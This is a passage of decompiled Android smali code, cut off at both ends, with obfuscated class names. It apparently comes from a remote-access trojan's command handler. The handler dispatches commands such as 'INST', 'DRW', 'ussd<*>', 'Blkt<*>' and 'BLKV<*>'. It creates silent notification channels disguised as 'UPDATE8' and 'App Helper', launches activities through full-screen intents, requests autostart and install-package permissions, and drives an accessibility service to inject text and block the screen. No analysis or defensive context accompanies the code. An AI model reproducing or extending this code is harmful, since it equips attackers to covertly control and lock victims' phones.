
    const-class v5, Landroid/app/NotificationManager;

    invoke-virtual {v0, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    if-eqz v0, :cond_52

    const-string v5, "Config"

    .line 1039
    invoke-virtual {v0, v5}, Landroid/app/NotificationManager;->getNotificationChannel(Ljava/lang/String;)Landroid/app/NotificationChannel;

    move-result-object v5

    if-nez v5, :cond_52

    .line 1040
    new-instance v5, Landroid/app/NotificationChannel;

    const-string v6, "Config"

    const-string v9, "UPDATE8"

    invoke-direct {v5, v6, v9, v7}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    const-string v6, "App Helper"

    .line 1041
    invoke-virtual {v5, v6}, Landroid/app/NotificationChannel;->setDescription(Ljava/lang/String;)V

    .line 1042
    invoke-virtual {v5, v3}, Landroid/app/NotificationChannel;->setShowBadge(Z)V

    const/4 v6, 0x0

    .line 1043
    invoke-virtual {v5, v6, v6}, Landroid/app/NotificationChannel;->setSound(Landroid/net/Uri;Landroid/media/AudioAttributes;)V

    .line 1044
    invoke-virtual {v0, v5}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V
    :try_end_3a
    .catch Ljava/lang/Exception; {:try_start_3a .. :try_end_3a} :catch_a
    .catch Ljava/lang/OutOfMemoryError; {:try_start_3a .. :try_end_3a} :catch_15

    goto :goto_1c

    .line 1048
    :cond_52
    :try_start_3b
    aget-object v0, p1, v3

    const/16 v5, 0x1cdf

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->cancelnotification(Landroid/content/Context;I)V
    :try_end_3b
    .catch Ljava/lang/Exception; {:try_start_3b .. :try_end_3b} :catch_9
    .catch Ljava/lang/OutOfMemoryError; {:try_start_3b .. :try_end_3b} :catch_15

    .line 1053
    :catch_9
    :cond_53
    :goto_1c
    :try_start_3c
    new-instance v0, Landroid/content/Intent;

    aget-object v5, p1, v3

    const-class v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/fgggyjcnlusrcshwnemydijbndqyawzbffmtgvisnvxfizqkgt21;

    invoke-direct {v0, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 1054
    invoke-virtual {v0, v13}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 1055
    aget-object v5, p1, v3

    const/high16 v6, 0xc000000

    invoke-static {v5, v3, v0, v6}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    .line 1057
    new-instance v5, Landroidx/core/app/NotificationCompat$Builder;

    aget-object v6, p1, v3

    const-string v7, "Config"

    invoke-direct {v5, v6, v7}, Landroidx/core/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const v6, 0x106000d

    invoke-virtual {v5, v6}, Landroidx/core/app/NotificationCompat$Builder;->setSmallIcon(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->completeinstallnotifi_title:Ljava/lang/String;

    invoke-virtual {v5, v6}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->completeinstallnotifi_msg:Ljava/lang/String;

    invoke-virtual {v5, v6}, Landroidx/core/app/NotificationCompat$Builder;->setContentText(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    const/4 v6, -0x1

    invoke-virtual {v5, v6}, Landroidx/core/app/NotificationCompat$Builder;->setPriority(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    const-string v7, "sys"

    invoke-virtual {v5, v7}, Landroidx/core/app/NotificationCompat$Builder;->setCategory(Ljava/lang/String;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    invoke-virtual {v5, v6}, Landroidx/core/app/NotificationCompat$Builder;->setDefaults(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    invoke-virtual {v5, v8}, Landroidx/core/app/NotificationCompat$Builder;->setOngoing(Z)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    const/4 v6, 0x0

    invoke-virtual {v5, v6}, Landroidx/core/app/NotificationCompat$Builder;->setSound(Landroid/net/Uri;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    invoke-virtual {v5, v3}, Landroidx/core/app/NotificationCompat$Builder;->setAutoCancel(Z)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    invoke-virtual {v5, v0, v8}, Landroidx/core/app/NotificationCompat$Builder;->setFullScreenIntent(Landroid/app/PendingIntent;Z)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    .line 1059
    aget-object v5, p1, v3

    invoke-static {v5}, Landroidx/core/app/NotificationManagerCompat;->from(Landroid/content/Context;)Landroidx/core/app/NotificationManagerCompat;

    move-result-object v5

    .line 1061
    invoke-virtual {v0}, Landroidx/core/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object v0

    const/16 v6, 0x1cdf

    invoke-virtual {v5, v6, v0}, Landroidx/core/app/NotificationManagerCompat;->notify(ILandroid/app/Notification;)V
    :try_end_3c
    .catch Ljava/lang/Exception; {:try_start_3c .. :try_end_3c} :catch_a
    .catch Ljava/lang/OutOfMemoryError; {:try_start_3c .. :try_end_3c} :catch_15

    .line 1064
    :catch_a
    :try_start_3d
    new-instance v0, Landroid/content/Intent;

    aget-object v5, p1, v3

    const-class v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/fgggyjcnlusrcshwnemydijbndqyawzbffmtgvisnvxfizqkgt21;

    invoke-direct {v0, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 1065
    invoke-virtual {v0, v13}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v5, 0x800000

    .line 1067
    invoke-virtual {v0, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 1070
    aget-object v5, p1, v3

    invoke-virtual {v5, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_3d
    .catch Ljava/lang/Exception; {:try_start_3d .. :try_end_3d} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_3d .. :try_end_3d} :catch_15

    .line 1073
    :try_start_3e
    invoke-static {}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AutoStart;->getInstance()L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AutoStart;

    move-result-object v0

    .line 1074
    aget-object v5, p1, v3

    invoke-virtual {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AutoStart;->isAutoStartPermissionAvailable(Landroid/content/Context;)Z

    move-result v5

    if-eqz v5, :cond_54

    .line 1075
    aget-object v5, p1, v3

    invoke-virtual {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AutoStart;->getAutoStartPermission(Landroid/content/Context;)Z
    :try_end_3e
    .catch Ljava/lang/Exception; {:try_start_3e .. :try_end_3e} :catch_b
    .catch Ljava/lang/OutOfMemoryError; {:try_start_3e .. :try_end_3e} :catch_15

    .line 1079
    :catch_b
    :cond_54
    :try_start_3f
    aget-object v0, p1, v3

    const/16 v5, 0x1cdf

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->cancelnotification(Landroid/content/Context;I)V

    goto/16 :goto_2a

    .line 1084
    :cond_55
    invoke-static {}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AutoStart;->getInstance()L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AutoStart;

    move-result-object v0

    .line 1085
    aget-object v5, p1, v3

    invoke-virtual {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AutoStart;->isAutoStartPermissionAvailable(Landroid/content/Context;)Z

    move-result v5

    if-eqz v5, :cond_af

    .line 1086
    aget-object v5, p1, v3

    invoke-virtual {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AutoStart;->getAutoStartPermission(Landroid/content/Context;)Z

    goto/16 :goto_2a

    :cond_56
    const-string v0, "DRW"

    .line 1091
    invoke-virtual {v5, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0
    :try_end_3f
    .catch Ljava/lang/Exception; {:try_start_3f .. :try_end_3f} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_3f .. :try_end_3f} :catch_15

    if-eqz v0, :cond_59

    .line 1093
    :try_start_40
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v0, v10, :cond_58

    .line 1094
    aget-object v0, p1, v3

    const-class v5, Landroid/app/NotificationManager;

    invoke-virtual {v0, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    if-eqz v0, :cond_57

    const-string v5, "Prim"

    .line 1096
    invoke-virtual {v0, v5}, Landroid/app/NotificationManager;->getNotificationChannel(Ljava/lang/String;)Landroid/app/NotificationChannel;

    move-result-object v5

    if-nez v5, :cond_57

    .line 1097
    new-instance v5, Landroid/app/NotificationChannel;

    const-string v6, "Prim"

    const-string v9, "UPDATE4"

    const/4 v10, 0x4

    invoke-direct {v5, v6, v9, v10}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    const-string v6, "App Helper"

    .line 1098
    invoke-virtual {v5, v6}, Landroid/app/NotificationChannel;->setDescription(Ljava/lang/String;)V

    .line 1099
    invoke-virtual {v5, v3}, Landroid/app/NotificationChannel;->setShowBadge(Z)V

    const/4 v6, 0x0

    .line 1100
    invoke-virtual {v5, v6, v6}, Landroid/app/NotificationChannel;->setSound(Landroid/net/Uri;Landroid/media/AudioAttributes;)V

    .line 1101
    invoke-virtual {v0, v5}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V
    :try_end_40
    .catch Ljava/lang/Exception; {:try_start_40 .. :try_end_40} :catch_d
    .catch Ljava/lang/OutOfMemoryError; {:try_start_40 .. :try_end_40} :catch_15

    goto :goto_1d

    .line 1105
    :cond_57
    :try_start_41
    aget-object v0, p1, v3

    const/16 v5, 0x1e63

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->cancelnotification(Landroid/content/Context;I)V
    :try_end_41
    .catch Ljava/lang/Exception; {:try_start_41 .. :try_end_41} :catch_c
    .catch Ljava/lang/OutOfMemoryError; {:try_start_41 .. :try_end_41} :catch_15

    .line 1110
    :catch_c
    :cond_58
    :goto_1d
    :try_start_42
    new-instance v0, Landroid/content/Intent;

    aget-object v5, p1, v3

    const-class v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lbmvkgmomdnnhihblocwyefblihcjgesagwgjogdnbygtljrjx22Over;

    invoke-direct {v0, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 1111
    invoke-virtual {v0, v13}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 1112
    aget-object v5, p1, v3

    const/high16 v6, 0xc000000

    invoke-static {v5, v3, v0, v6}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    .line 1114
    new-instance v5, Landroidx/core/app/NotificationCompat$Builder;

    aget-object v6, p1, v3

    const-string v9, "Prim"

    invoke-direct {v5, v6, v9}, Landroidx/core/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const v6, 0x106000d

    invoke-virtual {v5, v6}, Landroidx/core/app/NotificationCompat$Builder;->setSmallIcon(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->completeinstallnotifi_title:Ljava/lang/String;

    invoke-virtual {v5, v6}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->completeinstallnotifi_msg:Ljava/lang/String;

    invoke-virtual {v5, v6}, Landroidx/core/app/NotificationCompat$Builder;->setContentText(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    invoke-virtual {v5, v7}, Landroidx/core/app/NotificationCompat$Builder;->setPriority(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    const-string v6, "sys"

    invoke-virtual {v5, v6}, Landroidx/core/app/NotificationCompat$Builder;->setCategory(Ljava/lang/String;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    invoke-virtual {v5, v8}, Landroidx/core/app/NotificationCompat$Builder;->setOngoing(Z)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    const/4 v6, 0x0

    invoke-virtual {v5, v6}, Landroidx/core/app/NotificationCompat$Builder;->setSound(Landroid/net/Uri;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    invoke-virtual {v5, v3}, Landroidx/core/app/NotificationCompat$Builder;->setAutoCancel(Z)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    invoke-virtual {v5, v0, v8}, Landroidx/core/app/NotificationCompat$Builder;->setFullScreenIntent(Landroid/app/PendingIntent;Z)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    .line 1116
    aget-object v5, p1, v3

    invoke-static {v5}, Landroidx/core/app/NotificationManagerCompat;->from(Landroid/content/Context;)Landroidx/core/app/NotificationManagerCompat;

    move-result-object v5

    .line 1118
    invoke-virtual {v0}, Landroidx/core/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object v0

    const/16 v6, 0x1d22

    invoke-virtual {v5, v6, v0}, Landroidx/core/app/NotificationManagerCompat;->notify(ILandroid/app/Notification;)V
    :try_end_42
    .catch Ljava/lang/Exception; {:try_start_42 .. :try_end_42} :catch_d
    .catch Ljava/lang/OutOfMemoryError; {:try_start_42 .. :try_end_42} :catch_15

    .line 1123
    :catch_d
    :try_start_43
    aget-object v0, p1, v3

    new-instance v5, Landroid/content/Intent;

    aget-object v6, p1, v3

    const-class v7, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lbmvkgmomdnnhihblocwyefblihcjgesagwgjogdnbygtljrjx22Over;

    invoke-direct {v5, v6, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v5, v13}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v0, v5}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 1125
    aget-object v0, p1, v3

    const/16 v5, 0x1d22

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->cancelnotification(Landroid/content/Context;I)V

    goto/16 :goto_2a

    :cond_59
    const-string v0, "INST"

    .line 1130
    invoke-virtual {v5, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_5a

    .line 1132
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v0, v10, :cond_af

    .line 1133
    aget-object v0, p1, v3

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/pm/PackageManager;->canRequestPackageInstalls()Z

    move-result v0

    if-nez v0, :cond_af

    .line 1134
    new-instance v0, Landroid/content/Intent;

    aget-object v5, p1, v3

    const-class v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RequestInstallPrim;

    invoke-direct {v0, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 1135
    invoke-virtual {v0, v13}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v5, 0x800000

    .line 1136
    invoke-virtual {v0, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 1137
    aget-object v5, p1, v3

    invoke-virtual {v5, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_2a

    .line 1143
    :cond_5a
    invoke-static {v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/PermissionsManager;->GetRequierdPrims(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_af

    .line 1144
    array-length v5, v0

    if-lez v5, :cond_af

    .line 1145
    aget-object v5, v0, v3

    const-string v6, "EX"

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_5b

    .line 1146
    aget-object v0, v0, v8

    .line 1147
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->PermissionsM:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "EX:"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-static {v5, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    goto/16 :goto_2a

    .line 1150
    :cond_5b
    new-instance v5, Landroid/content/Intent;

    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->appContext:Landroid/content/Context;

    const-class v7, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RequestPermission2;

    invoke-direct {v5, v6, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 1151
    invoke-virtual {v5, v13}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v6, 0x800000

    .line 1152
    invoke-virtual {v5, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const-string v6, "key"

    .line 1153
    invoke-virtual {v5, v6, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;[Ljava/lang/String;)Landroid/content/Intent;

    .line 1154
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->appContext:Landroid/content/Context;

    invoke-virtual {v0, v5}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_43
    .catch Ljava/lang/Exception; {:try_start_43 .. :try_end_43} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_43 .. :try_end_43} :catch_15

    goto/16 :goto_2a

    :cond_5c
    const/4 v6, -0x1

    .line 1163
    :try_start_44
    aget-object v0, v10, v8

    const-string v5, "ussd<*>"

    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0
    :try_end_44
    .catch Ljava/lang/Exception; {:try_start_44 .. :try_end_44} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_44 .. :try_end_44} :catch_15

    if-eqz v0, :cond_5d

    .line 1165
    :try_start_45
    aget-object v0, v10, v8

    const-string v5, "ussd<*>"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->StartView(Ljava/lang/String;)V
    :try_end_45
    .catch Ljava/lang/Exception; {:try_start_45 .. :try_end_45} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_45 .. :try_end_45} :catch_15

    goto/16 :goto_2a

    .line 1169
    :cond_5d
    :try_start_46
    aget-object v0, v10, v8

    const-string v5, "Blkt<*>"

    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0
    :try_end_46
    .catch Ljava/lang/Exception; {:try_start_46 .. :try_end_46} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_46 .. :try_end_46} :catch_15

    if-eqz v0, :cond_5e

    .line 1171
    :try_start_47
    aget-object v0, v10, v8

    const-string v5, "Blkt<*>"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 1173
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    if-eqz v5, :cond_af

    .line 1174
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    invoke-virtual {v5, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->setBtext(Ljava/lang/String;)V
    :try_end_47
    .catch Ljava/lang/Exception; {:try_start_47 .. :try_end_47} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_47 .. :try_end_47} :catch_15

    goto/16 :goto_2a

    .line 1179
    :cond_5e
    :try_start_48
    aget-object v0, v10, v8

    const-string v5, "BLKV<*>"

    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0
    :try_end_48
    .catch Ljava/lang/Exception; {:try_start_48 .. :try_end_48} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_48 .. :try_end_48} :catch_15

    if-eqz v0, :cond_60

    .line 1181
    :try_start_49
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    if-eqz v0, :cond_af

    .line 1182
    aget-object v0, v10, v8

    const-string v5, "BLKV<*>"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 1183
    invoke-virtual {v0, v15}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5f

    .line 1184
    aget-object v0, p1, v3

    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->isblocked:Ljava/lang/String;

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static {v0, v5, v6}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->WriteBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    .line 1185
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    if-eqz v0, :cond_af

    .line 1186
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    const-string v5, "Block"

    const/4 v6, 0x0

    invoke-virtual {v0, v5, v6}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->Treger(Ljava/lang/String;[Ljava/lang/String;)V

    goto/16 :goto_2a

    .line 1188
    :cond_5f
    aget-object v0, p1, v3

